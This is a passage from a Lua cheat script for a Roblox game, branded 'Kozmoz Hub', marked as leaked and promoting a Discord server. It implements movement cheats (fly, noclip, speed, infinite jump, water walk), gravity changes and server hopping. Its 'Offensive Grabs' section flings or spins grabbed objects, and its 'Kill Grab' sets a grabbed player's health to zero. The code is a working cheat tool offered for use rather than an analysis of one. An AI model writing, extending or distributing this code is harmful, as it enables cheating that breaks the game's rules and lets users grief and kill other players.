        if success and result and result.data then
            bestServer, bestPlayers = nil, 0
            for _, server in pairs(result.data) do
                if server.id ~= game.JobId and server.playing > 19 and server.playing > bestPlayers and server.playing < server.maxPlayers then
                    bestServer = server
                    bestPlayers = server.playing
                end
            end
            if bestServer then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, bestServer.id, player)
                return
            end
        end
    end
})

RightGroupbox:AddButton({
    Text = "Exit Game",
    Func = function() game:Shutdown() end
})

RightGroupbox:AddButton({
    Text = "discord.gg/KseezeEjc",
    Func = function()
        setclipboard("https://discord.gg/KseezeEjc")
    end
})

CreditsLeftGroupbox = Tabs.MainTab:AddRightGroupbox("Credits & Supporters", "users", true, Color3.fromRGB(193, 205, 205))
CreditsLeftGroupbox:AddDivider()
CreditsLeftGroupbox:AddLabel("leaked by virck", true, Color3.fromRGB(128, 128, 128))
CreditsLeftGroupbox:AddLabel("Discord.gg/KseezeEjc", true)
CreditsLeftGroupbox:AddLabel("Discord.gg/KseezeEjc", true)
CreditsLeftGroupbox:AddLabel("ty ebo_l for helping me leak THIS")
CreditsLeftGroupbox:AddDivider()
CreditsLeftGroupbox:AddLabel("Discord.gg/KseezeEjc", true, Color3.fromRGB(128, 128, 128))
CreditsLeftGroupbox:AddLabel("Discord.gg/KseezeEjc", true)
CreditsLeftGroupbox:AddLabel("Discord.gg/KseezeEjc", true)
CreditsLeftGroupbox:AddLabel("Discord.gg/KseezeEjc", true)
CreditsLeftGroupbox:AddDivider()
CreditsLeftGroupbox:AddLabel("Discord.gg/KseezeEjc", true, Color3.fromRGB(128, 128, 128))
CreditsLeftGroupbox:AddLabel("Discord.gg/KseezeEjc", true)

FooterLeftGroupbox = Tabs.MainTab:AddLeftGroupbox("Kozmoz Hub Footer", "info", true, Color3.fromRGB(128, 128, 128))
FooterLeftGroupbox:AddLabel("• Build by Kozmoz Group", true, Color3.fromRGB(128, 128, 128))
FooterLeftGroupbox:AddLabel("• Enjoy and Start Aura Farming!", true, Color3.fromRGB(128, 128, 128))

WalkSpeedEnabled = false
WalkSpeedValue = 50
JumpPowerEnabled = false
JumpPowerValue = 100
InfiniteJumpEnabled = false
FOVEnabled = true
FOVValue = 70

Movement = {
    infJumpConn = nil,
    currentCharacter = nil,
    currentHumanoid = nil,
    rootPart = nil,
    moveForward = false,
    moveBackward = false,
    moveLeft = false,
    moveRight = false
}

function applyJumpPower()
    if not Movement.currentHumanoid then return end
    Movement.currentHumanoid.JumpPower = JumpPowerEnabled and JumpPowerValue or 25
end

function updateMovement()
    if not WalkSpeedEnabled or not Movement.rootPart or not Movement.currentHumanoid then return end
    camera = workspace.CurrentCamera
    cameraCF = camera.CFrame
    moveDirection = Vector3.zero

    if Movement.moveForward then moveDirection = moveDirection + cameraCF.LookVector end
    if Movement.moveBackward then moveDirection = moveDirection - cameraCF.LookVector end
    if Movement.moveLeft then moveDirection = moveDirection - cameraCF.RightVector end
    if Movement.moveRight then moveDirection = moveDirection + cameraCF.RightVector end

    if moveDirection.Magnitude > 0 then
        moveDirection = Vector3.new(moveDirection.X, 0, moveDirection.Z).Unit
        targetVelocity = moveDirection * WalkSpeedValue
        Movement.rootPart.AssemblyLinearVelocity = Vector3.new(targetVelocity.X, Movement.rootPart.AssemblyLinearVelocity.Y, targetVelocity.Z)
    else
        Movement.rootPart.AssemblyLinearVelocity = Vector3.new(0, Movement.rootPart.AssemblyLinearVelocity.Y, 0)
    end
end

function onInputBegan(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        key = input.KeyCode
        if key == Enum.KeyCode.W then Movement.moveForward = true
        elseif key == Enum.KeyCode.S then Movement.moveBackward = true
        elseif key == Enum.KeyCode.A then Movement.moveLeft = true
        elseif key == Enum.KeyCode.D then Movement.moveRight = true
        end
        updateMovement()
    end
end

function onInputEnded(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        key = input.KeyCode
        if key == Enum.KeyCode.W then Movement.moveForward = false
        elseif key == Enum.KeyCode.S then Movement.moveBackward = false
        elseif key == Enum.KeyCode.A then Movement.moveLeft = false
        elseif key == Enum.KeyCode.D then Movement.moveRight = false
        end
        updateMovement()
    end
end

Services.UserInputService.InputBegan:Connect(onInputBegan)
Services.UserInputService.InputEnded:Connect(onInputEnded)

PlayerLeftGroupbox = Tabs.PlayerTab:AddLeftGroupbox("Movement", "user")

PlayerLeftGroupbox:AddToggle("WalkSpeed", {
    Text = "Set WalkSpeed",
    Default = false,
    Callback = function(Value)
        WalkSpeedEnabled = Value
        if Movement.currentHumanoid then
            if Value then
                Movement.currentHumanoid.WalkSpeed = WalkSpeedValue
            else
                Movement.currentHumanoid.WalkSpeed = 16
                if Movement.rootPart then Movement.rootPart.AssemblyLinearVelocity = Vector3.new(0, Movement.rootPart.AssemblyLinearVelocity.Y, 0) end
            end
        end
    end
})

PlayerLeftGroupbox:AddSlider("WalkMultiplier", {
    Text = "Walk Speed", Default = 50, Min = 16, Max = 500, Decimals = 0,
    Callback = function(Value)
        WalkSpeedValue = Value
        if WalkSpeedEnabled and Movement.currentHumanoid then
            Movement.currentHumanoid.WalkSpeed = Value
            updateMovement()
        end
    end
})
PlayerLeftGroupbox:AddDivider()

local FlightSettings = {
    Enabled = false,
    Speed = 200,
    BodyVelocity = nil,
    BodyGyro = nil,
    FlightConnection = nil,
    CurrentVelocity = Vector3.new(0, 0, 0),
    IsInVehicle = false,
}

local function cleanupFlight()
    if FlightSettings.FlightConnection then
        FlightSettings.FlightConnection:Disconnect()
        FlightSettings.FlightConnection = nil
    end
    if FlightSettings.BodyVelocity then
        FlightSettings.BodyVelocity:Destroy()
        FlightSettings.BodyVelocity = nil
    end
    if FlightSettings.BodyGyro then
        FlightSettings.BodyGyro:Destroy()
        FlightSettings.BodyGyro = nil
    end
    local char = Services.LocalPlayer.Character
    if char then
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if humanoid and not FlightSettings.IsInVehicle then
            humanoid.PlatformStand = false
        end
    end
end

local function getFlightTarget()
    local char = Services.LocalPlayer.Character
    if not char then return nil end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return nil end
    if humanoid.Sit then
        FlightSettings.IsInVehicle = true
        local seat = humanoid.SeatPart
        if seat and seat.Parent then
            return seat.Parent:FindFirstChild("HumanoidRootPart") or seat
        end
    end
    FlightSettings.IsInVehicle = false
    return char:FindFirstChild("HumanoidRootPart")
end

local function applyFlightPhysics()
    local targetPart = getFlightTarget()
    if not targetPart then return end
    cleanupFlight()
    FlightSettings.BodyVelocity = Instance.new("BodyVelocity")
    FlightSettings.BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    FlightSettings.BodyVelocity.Velocity = Vector3.new(0, 0, 0)
    FlightSettings.BodyVelocity.P = 10000
    FlightSettings.BodyVelocity.Parent = targetPart
    FlightSettings.BodyGyro = Instance.new("BodyGyro")
    FlightSettings.BodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    FlightSettings.BodyGyro.CFrame = targetPart.CFrame
    FlightSettings.BodyGyro.P = 10000
    FlightSettings.BodyGyro.Parent = targetPart
    local char = Services.LocalPlayer.Character
    if char then
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if humanoid and not FlightSettings.IsInVehicle then
            humanoid.PlatformStand = true
        end
    end
    FlightSettings.CurrentVelocity = Vector3.new(0, 0, 0)
    FlightSettings.FlightConnection = Services.RunService.Heartbeat:Connect(function()
        if not FlightSettings.Enabled then
            cleanupFlight()
            return
        end
        local currentTarget = getFlightTarget()
        if not currentTarget or not currentTarget.Parent then
            return
        end
        if FlightSettings.BodyVelocity and FlightSettings.BodyVelocity.Parent ~= currentTarget then
            applyFlightPhysics()
            return
        end
        local moveDir = Vector3.new(0, 0, 0)
        local Camera = workspace.CurrentCamera
        if Services.UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Camera.CFrame.LookVector end
        if Services.UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - Camera.CFrame.LookVector end
        if Services.UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - Camera.CFrame.RightVector end
        if Services.UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Camera.CFrame.RightVector end
        if Services.UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
        if Services.UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir - Vector3.new(0, 1, 0) end
        if moveDir.Magnitude > 0 then
            moveDir = moveDir.Unit
        end
        local targetVelocity = moveDir * FlightSettings.Speed
        FlightSettings.CurrentVelocity = FlightSettings.CurrentVelocity:Lerp(targetVelocity, 0.2)
        if FlightSettings.BodyVelocity then
            FlightSettings.BodyVelocity.Velocity = FlightSettings.CurrentVelocity
        end
        if FlightSettings.BodyGyro then
            FlightSettings.BodyGyro.CFrame = Camera.CFrame
        end
    end)
end

local function setFlightState(state)
    FlightSettings.Enabled = state
    if not state then
        cleanupFlight()
    else
        applyFlightPhysics()
    end
end

if cons["FlightRespawn"] then cons["FlightRespawn"]:Disconnect() end
cons["FlightRespawn"] = Services.LocalPlayer.CharacterAdded:Connect(function(char)
    if FlightSettings.Enabled then
        char:WaitForChild("HumanoidRootPart", 5)
        task.wait(0.2)
        if FlightSettings.Enabled then
            applyFlightPhysics()
        end
    end
end)

PlayerLeftGroupbox:AddToggle("FlyToggle", {
    Text = "Fly",
    Default = false,
    Callback = function(Value)
        setFlightState(Value)
    end
})

PlayerLeftGroupbox:AddSlider("FlySpeed", {
    Text = "Fly Speed",
    Default = 200,
    Min = 50,
    Max = 10000,
    Decimals = 0,
    Callback = function(Value)
        FlightSettings.Speed = Value
    end
})
PlayerLeftGroupbox:AddDivider()

PlayerLeftGroupbox:AddToggle("JumpPower", {
    Text = "Jump Power", Default = false,
    Callback = function(Value)
        JumpPowerEnabled = Value
        applyJumpPower()
    end
})

PlayerLeftGroupbox:AddSlider("JumpMultiplier", {
    Text = "Jump Power Value", Default = 100, Min = 25, Max = 500, Decimals = 0,
    Callback = function(Value)
        JumpPowerValue = Value
        if JumpPowerEnabled and Movement.currentHumanoid then
            Movement.currentHumanoid.JumpPower = Value
        end
    end
})

PlayerLeftGroupbox:AddDivider()

PlayerLeftGroupbox:AddToggle("InfiniteJump", {
    Text = "Infinite Jump", Default = false,
    Callback = function(Value)
        InfiniteJumpEnabled = Value
        if Value then
            if not Movement.infJumpConn then
                Movement.infJumpConn = Services.UserInputService.JumpRequest:Connect(function()
                    if InfiniteJumpEnabled and Movement.currentHumanoid and Movement.currentHumanoid.Health > 0 then
                        Movement.currentHumanoid:ChangeState("Jumping")
                    end
                end)
            end
        else
            if Movement.infJumpConn then Movement.infJumpConn:Disconnect() Movement.infJumpConn = nil end
        end
    end
})

zeroGravityActive = false
originalGravity = workspace.Gravity

noclipActive = false
noclipConnection = nil

PlayerLeftGroupbox:AddToggle("NoclipToggle", {
    Text = "Noclip",
    Default = false,
    Callback = function(value)
        noclipActive = value
        if noclipConnection then
            noclipConnection:Disconnect()
            noclipConnection = nil
        end
        if value then
            noclipConnection = game:GetService("RunService").Stepped:Connect(function()
                if noclipActive and Services.LocalPlayer.Character then
                    for _, v in pairs(Services.LocalPlayer.Character:GetDescendants()) do
                        if v:IsA("BasePart") then
                            v.CanCollide = false
                        end
                    end
                end
            end)
        end
    end
})

WaterWalkEnabled = false
waterParts = {}

function findWaterParts()
    waterParts = {}
    ocean = Services.Workspace:FindFirstChild("Map")
    if ocean then
        ocean = ocean:FindFirstChild("AlwaysHereTweenedObjects")
        if ocean then
            ocean = ocean:FindFirstChild("Ocean")
            if ocean then
                ocean = ocean:FindFirstChild("Object")
                if ocean then
                    ocean = ocean:FindFirstChild("ObjectModel")
                    if ocean then
                        for _, part in pairs(ocean:GetChildren()) do
                            if part.Name == "Ocean" then
                                table.insert(waterParts, part)
                            end
                        end
                    end
                end
            end
        end
    end
    return waterParts
end

function toggleWaterWalk(enabled)
    WaterWalkEnabled = enabled
    parts = findWaterParts()
    if #parts == 0 then
        task.wait(1)
        parts = findWaterParts()
    end
    for _, part in pairs(parts) do
        part.CanCollide = enabled
    end
end

PlayerLeftGroupbox:AddToggle("WaterWalkToggle", {
    Text = "Water Walk",
    Default = false,
    Callback = function(Value)
        toggleWaterWalk(Value)
    end
})

PlayerLeftGroupbox:AddDivider()

PlayerLeftGroupbox:AddButton({
    Text = "Reset Character",
    Func = function()
        if Services.LocalPlayer.Character then
            Services.LocalPlayer.Character:BreakJoints()
        end
    end
})

PhysicsGroupbox = Tabs.PlayerTab:AddLeftGroupbox("Physics", "bolt")

ZG = {
    zeroGravityActive = false,
    originalGravity = workspace.Gravity
}

PhysicsGroupbox:AddButton({
    Text = "Zero Gravity",
    Func = function()
        if ZG.zeroGravityActive then
            return
        else
            ZG.originalGravity = workspace.Gravity
            workspace.Gravity = 0
            ZG.zeroGravityActive = true
        end
    end
})

PhysicsGroupbox:AddButton({
    Text = "Reset Gravity",
    Func = function()
        if ZG.zeroGravityActive then
            workspace.Gravity = ZG.originalGravity
            ZG.zeroGravityActive = false
        end
    end
})

PhysicsGroupbox:AddDivider()

flingPower = 200

PhysicsGroupbox:AddSlider("FlingPower", {
    Text = "Fling Power",
    Default = 200,
    Min = 50,
    Max = 500,
    Decimals = 0,
    Callback = function(Value)
        flingPower = Value
    end
})

function flingSelf()
    character = Services.LocalPlayer.Character
    hrp = character and character:FindFirstChild("HumanoidRootPart")
    if not hrp then
        return
    end
    camera = Services.Workspace.CurrentCamera
    direction = camera.CFrame.LookVector * flingPower
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyLinearVelocity = direction
end

PhysicsGroupbox:AddButton({
    Text = "Fling Self (Camera Direction)",
    Func = function()
        flingSelf()
    end
})

FK = {
    flingKeybindActive = false,
    selectedFlingKey = Enum.KeyCode.G,
    keybindSelectionActive = false,
    keybindDisplayLabel = nil
}

FK.keybindDisplayLabel = PhysicsGroupbox:AddLabel("Keybind: G")

PhysicsGroupbox:AddButton({
    Text = "Change Keybind",
    Func = function()
        FK.keybindSelectionActive = true
        task.delay(5, function()
            if FK.keybindSelectionActive then
                FK.keybindSelectionActive = false
            end
        end)
    end
})

PhysicsGroupbox:AddToggle("EnableFlingKeybind", {
    Text = "Enable Fling Keybind",
    Default = false,
    Callback = function(value)
        FK.flingKeybindActive = value
        if value then
            keyName = string.gsub(tostring(FK.selectedFlingKey), "Enum.KeyCode.", "")
        end
    end
})

Services.UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if FK.keybindSelectionActive and input.UserInputType == Enum.UserInputType.Keyboard then
        FK.keybindSelectionActive = false
        FK.selectedFlingKey = input.KeyCode
        keyName = string.gsub(tostring(FK.selectedFlingKey), "Enum.KeyCode.", "")
        FK.keybindDisplayLabel:SetText('<font color="rgb(255, 160, 0)">Keybind: ' .. keyName .. '</font>')
    end
    if FK.flingKeybindActive and input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == FK.selectedFlingKey then
        flingSelf()
    end
end)

PlayerRightGroupbox = Tabs.PlayerTab:AddRightGroupbox("Camera", "camera")

PC = {
    Players = game:GetService("Players"),
    LocalPlayer = game:GetService("Players").LocalPlayer,
    Camera = workspace.CurrentCamera,
    UserInputService = game:GetService("UserInputService")
}

ThirdPersonEnabled = false

local function SetThirdPerson(Value)
    if Value then
        PC.LocalPlayer.CameraMode = Enum.CameraMode.Classic
        PC.Camera.CameraType = Enum.CameraType.Custom
        PC.LocalPlayer.CameraMaxZoomDistance = 2500
        PC.LocalPlayer.CameraMinZoomDistance = 11
        PC.UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
        if PC.LocalPlayer.Character then
            hum = PC.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                PC.Camera.CameraSubject = hum
            end
        end
    else
        PC.LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
        PC.Camera.CameraType = Enum.CameraType.Custom
        PC.LocalPlayer.CameraMaxZoomDistance = 0
        PC.LocalPlayer.CameraMinZoomDistance = 0
        PC.UserInputService.MouseBehavior = Enum.MouseBehavior.Default
        if PC.LocalPlayer.Character then
            hum = PC.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                PC.Camera.CameraSubject = hum
            end
        end
    end
end

PlayerRightGroupbox:AddToggle("ThirdPersonToggle", {
    Text = "Enable Third Person",
    Default = false,
    Callback = function(Value)
        ThirdPersonEnabled = Value
        SetThirdPerson(Value)
    end
})

Services.LocalPlayer.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    if ThirdPersonEnabled then
        hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            PC.Camera.CameraSubject = hum
        end
        PC.UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
        PC.LocalPlayer.CameraMode = Enum.CameraMode.Classic
        PC.Camera.CameraType = Enum.CameraType.Custom
        PC.LocalPlayer.CameraMaxZoomDistance = 2500
        PC.LocalPlayer.CameraMinZoomDistance = 11
    end
end)

PlayerRightGroupbox:AddDivider()

PlayerRightGroupbox:AddToggle("FOV", {
    Text = "FOV Changer", Default = true,
    Callback = function(Value)
        FOVEnabled = Value
        workspace.CurrentCamera.FieldOfView = Value and FOVValue or 70
    end
})

PlayerRightGroupbox:AddSlider("FOVSlider", {
    Text = "FOV Value", Default = 70, Min = -50, Max = 120, Decimals = 0,
    Callback = function(Value)
        FOVValue = Value
        if FOVEnabled then workspace.CurrentCamera.FieldOfView = Value end
    end
})

-- [KOZMOZ] Remove Limbs (PNG1'deki kod): secilen uzvu gorunmez + carpipmasiz yapar
-- FOV Changer'in hemen altina eklendi; olu/genc character'da kendiliginden yeniler.
KozRemoveLimbs = {
    Selected = "Right Arm",
    Enabled = false,
    SavedParts = {},
    PartMap = {
        ["Right Arm"] = { "Right Arm", "RightUpperArm", "RightLowerArm", "RightHand" },
        ["Left Arm"] = { "Left Arm", "LeftUpperArm", "LeftLowerArm", "LeftHand" },
        ["Right Leg"] = { "Right Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot" },
        ["Left Leg"] = { "Left Leg", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot" },
        ["Head"] = { "Head" },
    },
}

function KozRemoveLimbs:Restore()
    for part, old in pairs(self.SavedParts) do
        if part and part.Parent then
            pcall(function()
                part.LocalTransparencyModifier = old.Transparency
                part.CanCollide = old.CanCollide
                part.CanTouch = old.CanTouch
                part.CanQuery = old.CanQuery
            end)
        end
    end
    table.clear(self.SavedParts)
end

function KozRemoveLimbs:Apply()
    self:Restore()
    if not self.Enabled then
        return
    end
    local character = Services.LocalPlayer.Character
    local partNames = self.PartMap[self.Selected]
    if not character or not partNames then
        return
    end
    for _, partName in ipairs(partNames) do
        local part = character:FindFirstChild(partName)
        if part and part:IsA("BasePart") then
            self.SavedParts[part] = {
                Transparency = part.LocalTransparencyModifier,
                CanCollide = part.CanCollide,
                CanTouch = part.CanTouch,
                CanQuery = part.CanQuery,
            }
            part.LocalTransparencyModifier = 1
            part.CanCollide = false
            part.CanTouch = false
            part.CanQuery = false
        end
    end
end

function KozRemoveLimbs:SetLimb(limbName)
    if not self.PartMap[limbName] then
        return
    end
    self.Selected = limbName
    if self.Enabled then
        self:Apply()
    end
end

function KozRemoveLimbs:SetEnabled(enabled)
    self.Enabled = enabled and true or false
    if self.Enabled then
        self:Apply()
    else
        self:Restore()
    end
end

Services.LocalPlayer.CharacterAdded:Connect(function()
    table.clear(KozRemoveLimbs.SavedParts)
    if KozRemoveLimbs.Enabled then
        task.wait(1)
        KozRemoveLimbs:Apply()
    end
end)

PlayerRightGroupbox:AddLabel("Remove Limbs", true, Color3.fromRGB(255, 160, 0))

PlayerRightGroupbox:AddToggle("KozRemoveLimb", {
    Text = "Remove Limb",
    Default = false,
    Callback = function(v)
        KozRemoveLimbs:SetEnabled(v)
    end
})

PlayerRightGroupbox:AddDropdown("KozRemoveLimbPart", {
    Text = "Limb",
    Values = { "Right Arm", "Left Arm", "Right Leg", "Left Leg", "Head" },
    Default = "Right Arm",
    Callback = function(v)
        KozRemoveLimbs:SetLimb(v)
    end
})

Services.RunService.Heartbeat:Connect(function()
    if WalkSpeedEnabled and Movement.rootPart then updateMovement() end
end)

function onCharacterAdded(character)
    Movement.currentCharacter = character
    Movement.currentHumanoid = character:WaitForChild("Humanoid", 5)
    Movement.rootPart = character:FindFirstChild("HumanoidRootPart")
    if not Movement.currentHumanoid then return end
    Movement.moveForward = false Movement.moveBackward = false Movement.moveLeft = false Movement.moveRight = false
    if WalkSpeedEnabled then
        Movement.currentHumanoid.WalkSpeed = WalkSpeedValue
        if Movement.rootPart then Movement.rootPart.AssemblyLinearVelocity = Vector3.new(0, Movement.rootPart.AssemblyLinearVelocity.Y, 0) end
    else
        Movement.currentHumanoid.WalkSpeed = 16
    end
    applyJumpPower()
    Movement.currentHumanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        if WalkSpeedEnabled and Movement.currentHumanoid and Movement.currentHumanoid.WalkSpeed ~= WalkSpeedValue then
            Movement.currentHumanoid.WalkSpeed = WalkSpeedValue
        end
    end)
    Movement.currentHumanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
        if JumpPowerEnabled and Movement.currentHumanoid and Movement.currentHumanoid.JumpPower ~= JumpPowerValue then
            Movement.currentHumanoid.JumpPower = JumpPowerValue
        end
    end)
end

if Services.LocalPlayer.Character then onCharacterAdded(Services.LocalPlayer.Character) end
Services.LocalPlayer.CharacterAdded:Connect(function(char)
    onCharacterAdded(char)
    refreshGlobals()
end)

PlayerSearchRightGroupbox = Tabs.PlayerTab:AddRightGroupbox("Player Search", "search")

SP = {
    Players = Services.Players,
    LocalPlayer = Services.LocalPlayer,
    selectedPlayer = nil,
    allPlayerValues = {},
    playerDropdown = nil,
    searchInput = nil
}

function refreshPlayerList()
    Services.allPlayerValues = {}
    for _, plr in ipairs(Services.Players:GetPlayers()) do
        table.insert(Services.allPlayerValues, plr.DisplayName .. " (" .. plr.Name .. ")")
    end
    table.sort(Services.allPlayerValues)
    return Services.allPlayerValues
end

function searchAndSelectPlayer(searchTerm)
    if not Services.playerDropdown then
        print("Dropdown not ready yet")
        return
    end
    if searchTerm == "" or not searchTerm then
        Services.playerDropdown:SetValues(Services.allPlayerValues)
        if #Services.allPlayerValues > 0 then
            Services.playerDropdown:SetValue(Services.allPlayerValues[1])
            Services.selectedPlayer = Services.allPlayerValues[1]
        end
        return
    end
    searchLower = string.lower(searchTerm)
    exactMatch = nil
    partialMatches = {}
    for _, value in ipairs(Services.allPlayerValues) do
        valueLower = string.lower(value)
        if string.find(valueLower, searchLower, 1, true) then
            table.insert(partialMatches, value)
        end
        displayName = value:match("^(.-) %(")
        if displayName and string.lower(displayName) == searchLower then
            exactMatch = value
        end
        username = value:match("%((.-)%)")
        if username and string.lower(username) == searchLower then
            exactMatch = value
        end
    end
    if exactMatch then
        Services.playerDropdown:SetValues({exactMatch})
        Services.playerDropdown:SetValue(exactMatch)
        Services.selectedPlayer = exactMatch
    elseif #partialMatches > 0 then
        Services.playerDropdown:SetValues(partialMatches)
        Services.playerDropdown:SetValue(partialMatches[1])
        Services.selectedPlayer = partialMatches[1]
    else
        Services.playerDropdown:SetValues({"No player found"})
        Services.selectedPlayer = nil
    end
end

function copySelectedID()
    if not SP.selectedPlayer or SP.selectedPlayer == "No player found" then
        return
    end
    username = SP.selectedPlayer:match("%((.-)%)")
    player = Services.Players:FindFirstChild(username)
    if player then
        setclipboard(tostring(player.UserId))
    end
end

SP.playerDropdown = PlayerSearchRightGroupbox:AddDropdown("PlayerDropdown", {
    Text = "Select Player",
    Values = refreshPlayerList(),
    Default = 1,
    Callback = function(value)
        SP.selectedPlayer = value
    end
})

SP.searchInput = PlayerSearchRightGroupbox:AddInput("SearchInput", {
    Text = "Search Player",
    Placeholder = "Enter username or display name...",
    Callback = function(value)
        searchAndSelectPlayer(value)
    end
})

PlayerSearchRightGroupbox:AddButton({
    Text = "Copy User ID",
    Func = copySelectedID
})

PlayerSearchRightGroupbox:AddButton({
    Text = "Refresh List",
    Func = function()
        newValues = refreshPlayerList()
        SP.playerDropdown:SetValues(newValues)
        if #newValues > 0 then
            SP.playerDropdown:SetValue(newValues[1])
        end
    end
})

CreditsMainGroupbox = Tabs.CreditsTab:AddLeftGroupbox("Credits", "heart", true, Color3.fromRGB(255, 160, 0))
CreditsMainGroupbox:AddLabel("KOZMOZ Hub", true, Color3.fromRGB(255, 160, 0))
CreditsMainGroupbox:AddLabel("Version: 1.0.0", true)
CreditsMainGroupbox:AddDivider()
CreditsMainGroupbox:AddLabel("Developed by Kozmoz Group", true)
CreditsMainGroupbox:AddLabel("Special thanks to all supporters!", true)

GrabsLeftGroupbox = Tabs.GrabsTab:AddLeftGroupbox("Offensive Grabs", "hand")
GrabsRightGroupbox = Tabs.GrabsTab:AddRightGroupbox("Utility Grabs", "cog")

Fling = {
    Active = false,
    Multiplier = 245,
    Connection = nil
}

GrabsLeftGroupbox:AddLabel("Fling Grab")
GrabsLeftGroupbox:AddToggle("FlingStrength", {
    Text = "Fling Strength",
    Default = false,
    Callback = function(Value)
        Fling.Active = Value
        if Value then
            Fling.Connection = Workspace.ChildAdded:Connect(function(newModel)
                if newModel.Name == "GrabParts" then
                    grabPart = newModel:FindFirstChild("GrabPart")
                    if grabPart then
                        weld = grabPart:FindFirstChild("WeldConstraint")
                        if weld and weld.Part1 then
                            targetPart = weld.Part1
                            velocityObj = Instance.new("BodyVelocity")
                            velocityObj.Parent = targetPart
                            newModel:GetPropertyChangedSignal("Parent"):Connect(function()
                                if not newModel.Parent then
                                    lastInput = Services.UserInputService:GetLastInputType()
                                    if lastInput == Enum.UserInputType.MouseButton2 then
                                        velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        velocityObj.Velocity = Services.Workspace.CurrentCamera.CFrame.LookVector * Fling.Multiplier
                                        game:GetService("Debris"):AddItem(velocityObj, 1)
                                    else
                                        velocityObj:Destroy()
                                    end
                                end
                            end)
                        end
                    end
                end
            end)
        else
            if Fling.Connection then
                Fling.Connection:Disconnect()
                Fling.Connection = nil
            end
        end
    end
})

GrabsLeftGroupbox:AddSlider("FlingMultiplier", {
    Text = "Fling Multiplier",
    Default = 245,
    Min = 100,
    Max = 10000,
    Decimals = 0,
    Callback = function(Value)
        Fling.Multiplier = Value
    end
})

GrabsLeftGroupbox:AddDivider()

Spin = {
    Enabled = false,
    Power = 10,
    Connection = nil,
    ActiveSpins = {}
}

GrabsLeftGroupbox:AddLabel("Spin Grab")
GrabsLeftGroupbox:AddToggle("SpinGrab", {
    Text = "Spin Grab",
    Default = false,
    Callback = function(Value)
        Spin.Enabled = Value
        if Value then
            Spin.Connection = Workspace.ChildAdded:Connect(function(newModel)
                if newModel.Name == "GrabParts" then
                    grabPart = newModel:FindFirstChild("GrabPart")
                    if grabPart then
                        weld = grabPart:FindFirstChild("WeldConstraint")
                        if weld and weld.Part1 then
                            targetPart = weld.Part1
                            spinObj = Instance.new("BodyAngularVelocity")
                            spinObj.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                            spinObj.AngularVelocity = Vector3.new(0, Spin.Power, 0)
                            spinObj.Parent = targetPart
                            table.insert(Spin.ActiveSpins, spinObj)
                            newModel:GetPropertyChangedSignal("Parent"):Connect(function()
                                if not newModel.Parent then
                                    if spinObj.Parent then spinObj:Destroy() end
                                    for i, obj in ipairs(Spin.ActiveSpins) do
                                        if obj == spinObj then table.remove(Spin.ActiveSpins, i) break end
                                    end
                                end
                            end)
                        end
                    end
                end
            end)
        else
            if Spin.Connection then Spin.Connection:Disconnect() Spin.Connection = nil end
            for _, obj in ipairs(Spin.ActiveSpins) do if obj.Parent then obj:Destroy() end end
            Spin.ActiveSpins = {}
        end
    end
})

GrabsLeftGroupbox:AddSlider("SpinPower", {
    Text = "Spin Power",
    Default = 10,
    Min = 1,
    Max = 100,
    Decimals = 0,
    Callback = function(Value)
        Spin.Power = Value
    end
})

GrabsLeftGroupbox:AddDivider()

KillGrab = {
    Active = false,
    Connection = nil
}

GrabsLeftGroupbox:AddLabel("Kill Grab")
GrabsLeftGroupbox:AddToggle("KillGrabFast", {
    Text = "Kill Grab",
    Default = false,
    Callback = function(value)
        KillGrab.Active = value
        if value then
            KillGrab.Connection = Workspace.ChildAdded:Connect(function(child)
                if child.Name == "GrabParts" and KillGrab.Active then
                    task.wait(0.2)
                    grabPart = child:FindFirstChild("GrabPart")
                    if grabPart then
                        weld = grabPart:FindFirstChild("WeldConstraint")
                        if weld and weld.Part1 then
                            grabbedPart = weld.Part1
                            myChar = game.Players.LocalPlayer.Character
                            if myChar and grabbedPart:IsDescendantOf(myChar) then
                                return
                            end
                            targetModel = grabbedPart.Parent
                            while targetModel and not targetModel:FindFirstChild("Humanoid") do
                                targetModel = targetModel.Parent
                            end
                            if targetModel then
                                humanoid = targetModel:FindFirstChild("Humanoid")
                                if humanoid and humanoid.Health > 0 then
                                    humanoid.Health = 0
                                    print("[Kill Grab] Killed: " .. (targetModel.Name or "Unknown"))
                                end
                            end
                        end
                    end
                end
            end)
        else
            if KillGrab.Connection then
                KillGrab.Connection:Disconnect()
                KillGrab.Connection = nil
            end
        end
    end
})

GrabsLeftGroupbox:AddDivider()
GrabsLeftGroupbox:AddLabel("TP Grab")

TPPositions = {
    ["Water"] = Vector3.new(-1152.9, 6.2, -141.1),
    ["Sky"] = Vector3.new(-163.6, 1601.9, 21),
    ["Spawn"] = Vector3.new(1.5, -7.4, 2.8),
